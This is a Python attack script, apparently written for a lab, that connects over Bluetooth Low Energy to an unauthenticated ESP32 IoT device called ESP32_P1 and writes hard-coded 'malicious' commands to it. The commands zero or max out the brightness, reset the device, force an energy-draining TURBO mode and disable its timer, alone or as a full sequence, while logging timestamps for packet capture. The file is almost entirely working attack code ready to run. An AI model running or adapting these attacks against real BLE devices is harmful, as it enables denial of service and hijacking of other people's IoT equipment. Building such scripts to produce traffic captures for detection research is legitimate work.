#!/usr/bin/env python3
"""
BLE Attack Direct - Ataque a ESP32_P1 (Sin Autenticación)
==========================================================

Script de ataque directo a ESP32_P1 usando dirección MAC o nombre.
Compatible con captura simultánea de tshark + nRF Sniffer.

ATAQUE IMPLEMENTADO:
- Conexión directa a ESP32_P1
- Inyección de comandos maliciosos
- DoS, Hijacking, Manipulation

USO:
    # Por nombre (si está advertising)
    python ble_attack_p1.py --target ESP32_P1
    
    # Por dirección MAC
    python ble_attack_p1.py --address XX:XX:XX:XX:XX:XX
    
    # Ataque específico
    python ble_attack_p1.py --target ESP32_P1 --attack dos-brightness
    python ble_attack_p1.py --target ESP32_P1 --attack hijack-turbo
    python ble_attack_p1.py --target ESP32_P1 --attack full

CAPTURA CON TSHARK (en otra terminal):
    tshark -i COM27 -w capture_p1_attack.pcapng
"""

import asyncio
import argparse
import sys
from datetime import datetime
from typing import Optional
from bleak import BleakClient, BleakScanner

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class ESP32_P1_Attacker:
    def __init__(self):
        self.target_address = None
        self.target_name = None
        self.client = None
        self.attack_log = []
        self.timestamp_file = "attack_timestamps.txt"
        self.attack_start_time = None
        self.attack_end_time = None
        
        # UUIDs de ESP32_P1
        self.service_uuid = "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
        self.cmd_uuid = "beb5483e-36e1-4688-b7f5-ea07361b26a8"
        self.state_uuid = "beb5483f-36e1-4688-b7f5-ea07361b26a8"
        
        # Comandos maliciosos (formato P1: 4 bytes)
        self.attacks = {
            "dos-brightness": {
                "name": "DoS - Brightness Zero",
                "cmd": [0x03, 0x00, 0x00, 0x00],
                "desc": "Apagar brillo completamente"
            },
            "dos-reset": {
                "name": "DoS - Reset Device",
                "cmd": [0x04, 0x00, 0x00, 0x00],
                "desc": "Resetear contadores y estado"
            },
            "hijack-turbo": {
                "name": "Hijacking - Force TURBO Mode",
                "cmd": [0x01, 0x02, 0x00, 0x00],
                "desc": "Forzar modo TURBO (consume más energía)"
            },
            "hijack-eco": {
                "name": "Hijacking - Force ECO Mode",
                "cmd": [0x01, 0x01, 0x00, 0x00],
                "desc": "Forzar modo ECO"
            },
            "timer-disable": {
                "name": "Manipulation - Disable Timer",
                "cmd": [0x06, 0x00, 0x00, 0x00],
                "desc": "Deshabilitar timer (0 segundos)"
            },
            "brightness-max": {
                "name": "Manipulation - Max Brightness",
                "cmd": [0x03, 0xFF, 0x00, 0x00],
                "desc": "Brillo al máximo (255)"
            }
        }
    
    def log(self, level, message):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        color = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED
        }.get(level, Colors.END)
        
        print(f"[{timestamp}] {color}[{level}]{Colors.END} {message}")
        self.attack_log.append({"timestamp": timestamp, "level": level, "message": message})
    
    async def find_device(self, target_name: Optional[str] = None, target_address: Optional[str] = None):
        """Buscar dispositivo por nombre o dirección MAC"""
        self.log("INFO", f"Scanning for target: {target_name or target_address}")
        
        devices = await BleakScanner.discover(timeout=10.0)
        
        for device in devices:
            # Buscar por nombre
            if target_name and device.name and target_name.lower() in device.name.lower():
                self.target_address = device.address
                self.target_name = device.name
                self.log("SUCCESS", f"Found by name: {device.name} ({device.address})")
                return True
            
            # Buscar por dirección MAC
            if target_address and device.address.lower() == target_address.lower():
                self.target_address = device.address
                self.target_name = device.name or "Unknown"
                self.log("SUCCESS", f"Found by address: {device.address}")
                return True
        
        self.log("ERROR", "Target device not found")
        
        # Listar dispositivos encontrados
        self.log("INFO", f"Discovered {len(devices)} devices:")
        for device in devices:
            print(f"  - {device.name or 'N/A':20s} {device.address}")
        
        return False
    
    async def connect(self):
        """Conectar al dispositivo"""
        if not self.target_address:
            self.log("ERROR", "No target address set")
            return False
        
        self.log("INFO", f"Connecting to {self.target_address}...")
        
        try:
            self.client = BleakClient(self.target_address, timeout=15.0)
            await self.client.connect()
            
            if self.client.is_connected:
                self.log("SUCCESS", "Connected successfully")
                return True
            else:
                self.log("ERROR", "Connection failed")
                return False
                
        except Exception as e:
            self.log("ERROR", f"Connection error: {e}")
            return False
    
    async def verify_services(self):
        """Verificar que tiene los servicios correctos"""
        self.log("INFO", "Verifying GATT services...")
        
        try:
            services = self.client.services
            
            # Buscar servicio de P1
            service = None
            for svc in services:
                if svc.uuid.lower() == self.service_uuid.lower():
                    service = svc
                    break
            
            if not service:
                self.log("ERROR", f"Service {self.service_uuid} not found")
                self.log("WARNING", "This might not be ESP32_P1")
                return False
            
            self.log("SUCCESS", "Service found: IoT Generic")
            
            # Verificar características
            cmd_char = None
            state_char = None
            
            for char in service.characteristics:
                if char.uuid.lower() == self.cmd_uuid.lower():
                    cmd_char = char
                    self.log("SUCCESS", "CMD characteristic found (Write)")
                
                if char.uuid.lower() == self.state_uuid.lower():
                    state_char = char
                    self.log("SUCCESS", "STATE characteristic found (Notify)")
            
            if not cmd_char:
                self.log("ERROR", "CMD characteristic not found")
                return False
            
            return True
            
        except Exception as e:
            self.log("ERROR", f"Service verification error: {e}")
            return False
    
    async def send_command(self, cmd_bytes: list, cmd_name: str):
        """Enviar comando al dispositivo"""
        hex_str = ' '.join(f'{b:02X}' for b in cmd_bytes)
        self.log("INFO", f"Sending {cmd_name}: [{hex_str}]")
        
        try:
            await self.client.write_gatt_char(self.cmd_uuid, bytes(cmd_bytes))
            self.log("SUCCESS", f"Command sent: {cmd_name}")
            await asyncio.sleep(0.5)  # Esperar respuesta
            return True
            
        except Exception as e:
            self.log("ERROR", f"Failed to send command: {e}")
            return False
    
    def save_timestamp(self, event: str, description: str):
        """Guardar timestamp de evento en archivo TXT"""
        timestamp = datetime.now()
        timestamp_str = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        epoch = timestamp.timestamp()
        
        with open(self.timestamp_file, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp_str}] [{epoch:.3f}] {event}: {description}\n")
    
    async def execute_attack(self, attack_type: str):
        """Ejecutar ataque específico"""
        # Marcar inicio del ataque
        self.attack_start_time = datetime.now()
        self.save_timestamp("ATTACK_START", f"Iniciando ataque '{attack_type}' a {self.target_address}")
        
        if attack_type == "full":
            # Secuencia completa de ataques
            self.log("WARNING", "Starting FULL ATTACK sequence...")
            print(f"\n{Colors.RED}{'='*70}{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}EXECUTING FULL ATTACK ON ESP32_P1{Colors.END}")
            print(f"{Colors.RED}{'='*70}{Colors.END}\n")
            
            self.save_timestamp("ATTACK_SEQUENCE", "Secuencia FULL comenzando")
            
            attacks_sequence = [
                ("hijack-eco", 2),
                ("brightness-max", 2),
                ("hijack-turbo", 2),
                ("dos-brightness", 2),
                ("timer-disable", 2),
                ("dos-reset", 1)
            ]
            
            for attack_name, delay in attacks_sequence:
                attack = self.attacks[attack_name]
                self.log("WARNING", f"Attack: {attack['name']}")
                print(f"  → {attack['desc']}")
                
                # Marcar inicio de comando individual
                self.save_timestamp(f"CMD_{attack_name.upper()}", f"{attack['name']} - {attack['desc']}")
                
                await self.send_command(attack["cmd"], attack["name"])
                await asyncio.sleep(delay)
            
            print(f"\n{Colors.RED}{'='*70}{Colors.END}")
            self.log("SUCCESS", "Full attack sequence completed")
            print(f"{Colors.RED}{'='*70}{Colors.END}\n")
            
        elif attack_type in self.attacks:
            # Ataque específico
            attack = self.attacks[attack_type]
            print(f"\n{Colors.YELLOW}Attack:{Colors.END} {attack['name']}")
            print(f"{Colors.YELLOW}Description:{Colors.END} {attack['desc']}\n")
            
            self.save_timestamp(f"CMD_{attack_type.upper()}", f"{attack['name']} - {attack['desc']}")
            await self.send_command(attack["cmd"], attack["name"])
            
        else:
            self.log("ERROR", f"Unknown attack type: {attack_type}")
        
        # Marcar fin del ataque
        self.attack_end_time = datetime.now()
        duration = (self.attack_end_time - self.attack_start_time).total_seconds()
        self.save_timestamp("ATTACK_END", f"Ataque '{attack_type}' finalizado. Duración: {duration:.3f}s")
    
    async def cleanup(self):
        """Desconectar"""
        if self.client and self.client.is_connected:
            await self.client.disconnect()
            self.log("INFO", "Disconnected")

async def main():
    parser = argparse.ArgumentParser(
        description="ESP32_P1 Direct Attack (No Authentication Required)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  dos-brightness    - Set brightness to 0 (visual DoS)
  dos-reset         - Reset device counters
  hijack-turbo      - Force TURBO mode (energy drain)
  hijack-eco        - Force ECO mode
  timer-disable     - Disable timer (set to 0)
  brightness-max    - Set brightness to maximum
  full              - Execute all attacks in sequence

Examples:
  python ble_attack_p1.py --target ESP32_P1 --attack full
  python ble_attack_p1.py --address 24:0A:C4:XX:XX:XX --attack dos-brightness
  
Capture with tshark (separate terminal):
  tshark -i COM27 -w attack_capture.pcapng
        """
    )
    
    parser.add_argument("--target", type=str, help="Target device name")
    parser.add_argument("--address", type=str, help="Target MAC address")
    parser.add_argument("--attack", type=str, default="full",
                       help="Attack type (default: full)")
    
    args = parser.parse_args()
    
    if not args.target and not args.address:
        print(f"{Colors.RED}Error: Must specify --target or --address{Colors.END}")
        parser.print_help()
        return
    
    attacker = ESP32_P1_Attacker()
    
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}ESP32_P1 Direct Attack - No Auth Required{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
    
    # Buscar dispositivo
    if not await attacker.find_device(args.target, args.address):
        return
    
    # Conectar
    if not await attacker.connect():
        return
    
    # Verificar servicios
    if not await attacker.verify_services():
        await attacker.cleanup()
        return
    
    # Ejecutar ataque
    await attacker.execute_attack(args.attack)
    
    # Limpiar
    await attacker.cleanup()
    
    print(f"\n{Colors.GREEN}Attack completed!{Colors.END}")
    print(f"Total operations: {len(attacker.attack_log)}")
    print(f"{Colors.CYAN}Timestamps saved to: {attacker.timestamp_file}{Colors.END}\n")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Attack interrupted by user{Colors.END}\n")
        sys.exit(0)
